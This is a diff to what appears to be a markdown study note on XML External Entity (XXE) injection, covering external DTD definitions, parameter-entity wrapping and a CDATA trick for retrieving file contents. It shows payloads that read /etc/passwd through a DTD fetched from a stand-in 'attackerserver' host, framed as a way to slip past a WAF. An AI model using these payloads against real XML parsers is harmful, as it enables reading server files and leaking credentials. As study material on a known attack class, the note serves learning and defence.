@@ -204,34 +204,76 @@ Note: It has to be defined before any XML document node begin. This means that w
       </sample>
       ```
 
-2. **External definition**
-   
-      External DTD file:
-   
-      ```dtd
+4. **External definition**
+
+   Supposed an application configured a WAF to disallow "/etc/passwd" to be sent to the server, the attacker can avoid using "/etc/passwd" in his request by defining entities outside of the injected XML to be included during run-time. 
+
+   External DTD file:
+
+   ```xml-dtd
    <!ENTITY callme SYSTEM "/etc/passwd">
    ```
 
-      Definition:
-   
-      ```xml-dtd
-      <!ENTITY % param1 SYSTEM "http://attackerserver/evil.dtd">
+   Definition:
+
+   ```dtd
+   <!ENTITY % param1 SYSTEM "http://attackerserver/evil.dtd">
    %param1;
+   ```
+
+   The above definition would fetch the definition of "callme" from an external server during run-time to be expanded in the following form:
+
+   ```dtd
+   <!ENTITY % param1 SYSTEM "http://attackerserver/evil.dtd">
+   <!ENTITY callme SYSTEM "/etc/passwd">
+   ```
+
+   Vulnerable call from original XML:
+
+   ```xml
+   <sample>&callme;</sample>
+   ```
+
+5. **Internal Subset problem**
+
+      Supposed a developer would like to wrap around a parameter entity as follows:
+
+      ```xml
+      <!DOCTYPE document [
+      	<!ENTITY % sample "hello world">
+       	<!ENTITY wrapped "<body>%sample;</body>" >
+      ]>
+      <document>&wrapped;</document>
       ```
 
-      The above definition would fetch the definition of "callme" from an external server during run-time to be expanded in the following form:
-   
-      ```xml-dtd
-      <!ENTITY % param1 SYSTEM "http://attackerserver/evil.dtd">
-      <!ENTITY callme SYSTEM "/etc/passwd">
+      The above would face an error *"XMLSyntaxError: PEReferences forbidden in internal subset"*.
+
+      In order to define a wrapper, an external entity has to be used.
+
+      external.dtd:
+
+      ```dtd
+      <!ENTITY wrapped "<body>%sample;</body>" >
       ```
-   
-      Vulnerable call from original XML:
-   
+
+      document.xml:
+
       ```xml
-      <sample>&callme;</sample>
+      <!DOCTYPE document [
+      	<!ENTITY % sample "hello world">
+       	<!ENTITY % dtd SYSTEM "external.dtd">
+      	%dtd;
+      ]>
+      <document>&wrapped;</document>
       ```
-   
+
+      Output:
+
+      ```xml
+      <document><body>hello world</body></document> 
+      ```
+
+      
 
 ### Observations
 
@@ -270,7 +312,15 @@ In the case of "&", this is due to parser scanning for an entity's name. Without
 00000060: 7f                                       .
 ```
 
+**Enters CDATA**
 
+Character Data (CDATA) can be used to surround illegal characters to prevent XML parser from parsing them.
+
+```xml
+<![CDATA[ Here is my secret & < TEST ]]>
+```
+
+if the file content can be surround by `<![CDATA[ ` and `]]>` , the file content can be retrievable. 
 
 ## Great Works by Others
 
